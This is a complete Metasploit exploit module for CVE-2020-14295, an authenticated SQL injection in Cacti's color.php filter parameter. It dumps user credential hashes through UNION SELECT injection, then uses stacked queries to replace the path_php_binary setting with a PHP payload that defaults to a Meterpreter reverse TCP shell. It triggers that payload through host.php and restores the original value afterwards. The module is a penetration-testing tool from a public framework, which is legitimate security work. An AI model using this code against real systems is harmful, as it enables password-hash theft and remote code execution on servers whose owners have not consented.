##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cacti color filter authenticated SQLi to RCE',
        'Description' => %q{
          This module exploits a SQL injection vulnerability in Cacti 1.2.12 and before. An admin can exploit the filter
          variable within color.php to pull arbitrary values as well as conduct stacked queries. With stacked queries, the
          path_php_binary value is changed within the settings table to a payload, and an update is called to execute the payload.
          After calling the payload, the value is reset.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Leonardo Paiva', # edb, RCE
          'Mayfly277' # original github, M4yFly on twitter SQLi
        ],
        'References' => [
          [ 'EDB', '49810' ],
          [ 'URL', 'https://github.com/Cacti/cacti/issues/3622' ],
          [ 'CVE', '2020-14295' ]
        ],
        'Privileged' => false,
        'Platform' => ['php'],
        'Arch' => ARCH_PHP,
        'DefaultOptions' => { 'Payload' => 'php/meterpreter/reverse_tcp' },
        'Payload' => {
          'BadChars' => "\x22\x27" # " '
        },
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Side Effects' => [ CONFIG_CHANGES, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        },
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2020-06-17',
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),
        OptString.new('PASSWORD', [ false, 'Password to login with', 'admin']),
        OptString.new('TARGETURI', [ true, 'The URI of Cacti', '/cacti/']),
        OptBool.new('CREDS', [ false, 'Dump cacti creds', true])
      ]
    )
  end

  def check
    begin
      res = send_request_cgi(
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'method' => 'GET'
      )
      return CheckCode::Safe("#{peer} - Could not connect to web service - no response") if res.nil?
      return CheckCode::Safe("#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200

      # cacti gives us the version in a JS variable
      /var cactiVersion='(?<version>\d{1,2}\.\d{1,2}\.\d{1,2})'/ =~ res.body

      if version && Rex::Version.new(version) <= Rex::Version.new('1.2.12')
        vprint_good("Version Detected: #{version}")
        return CheckCode::Appears
      end
    rescue ::Rex::ConnectionError
      CheckCode::Safe("#{peer} - Could not connect to the web service") # unknown maybe?
    end
    CheckCode::Safe("Cacti #{version} is not a vulnerable version.")
  end

  def exploit
    login

    # optionally grab the un/pass fields for all users.  While we're already admin, cred stuffing...
    if datastore['CREDS']
      # https://user-images.githubusercontent.com/23179648/84865521-a213eb80-b078-11ea-985f-f994d3409c72.png
      print_status('Dumping creds')
      res = inject("')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;")
      return unless res
      return if res.nil?
      return if res.body.nil?

      res.body.split.each do |cred|
        /"(?<username>[^"]+)","(?<hash>[^"]+)"/ =~ cred
        next unless hash
        next if hash == 'hex' # header row

        print_good("Username: #{username}, Password Hash: #{hash}")
        report_cred(
          username: username,
          password: hash,
          private_type: :nonreplayable_hash
        )
      end
    end

    print_status('Backing-up path_php_binary value')
    res = inject("')+UNION+SELECT+1,value,3,4,5,6,7+from+settings+where+name='path_php_binary';")

    # return value:
    # "name","hex"
    # "","FEFCFF"
    # "/usr/bin/php","3"
    if res && !res.body.nil?
      php_binary = res.body.split.last # check to make sure we have something first before proceeding
      fail_with(Failure::NotFound, "#{peer} - Unable to retrieve path_php_binary from server") if php_binary.nil?
      php_binary = php_binary.split(',')[0].gsub('"', '') # take last entry on page, and split to value
    end
    fail_with(Failure::NotFound, "#{peer} - Unable to retrieve path_php_binary from server") unless php_binary
    print_good("path_php_binary: #{php_binary}")

    print_status('Uploading payload')
    begin
      pload = "#{php_binary} -r '#{payload.encoded}' #"
      pload = Rex::Text.uri_encode(pload.gsub("'", "\\\\'"))
      inject("')+UNION+SELECT+1,2,3,4,5,6,7;update+settings+set+value='#{pload}'+where+name='path_php_binary';")
      print_good('Executing Payload')
      trigger
    ensure
      resetsqli(php_binary)
    end
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
  end

  def login
    cookie_jar.clear

    print_status('Grabbing CSRF')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'keep_cookies' => true
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200

    /name='__csrf_magic' value="(?<csrf>[^"]+)"/ =~ res.body
    fail_with(Failure::NotFound, 'Unable to find CSRF token') unless csrf

    print_good("CSRF: #{csrf}")

    print_status('Attempting login')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => {
        'login_username' => datastore['USERNAME'],
        'login_password' => datastore['PASSWORD'],
        'action' => 'login',
        '__csrf_magic' => csrf
      }
    )

    if res && res.code != 302
      fail_with(Failure::NoAccess, "#{peer} - Invalid credentials (response code: #{res.code})")
    end

    res
  end

  def inject(content)
    res = send_request_cgi(
      'uri' => "#{normalize_uri(target_uri.path, 'color.php')}?action=export&header=false&filter=1#{content}--+-",
      'keep_cookies' => true
    )

    if res && res.code != 200
      fail_with(Failure::UnexpectedReply, "#{peer} - Injection Failed (response code: #{res.code})")
    end
    res
  end

  def trigger
    send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'host.php'),
      'keep_cookies' => true,
      'vars_get' => {
        'action' => 'reindex'
      }
    )
  end

  def resetsqli(php_binary)
    print_status('Cleaning up environment')
    login # any subsequent requests with our cookie will fail, so we'll need to login a 2nd time to reset the database value correctly
    print_status('Resetting DB Value')
    inject("')+UNION+SELECT+1,2,3,4,5,6,7;update+settings+set+value='#{php_binary}'+where+name='path_php_binary';")
  end

  def report_cred(opts)
    service_data = {
      address: datastore['RHOST'],
      port: datastore['RPORT'],
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:username],
      private_data: opts[:password],
      private_type: opts[:private_type],
      jtr_format: identify_hash(opts[:password])
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: ''
    }.merge(service_data)
    create_credential_login(login_data)
  end

end
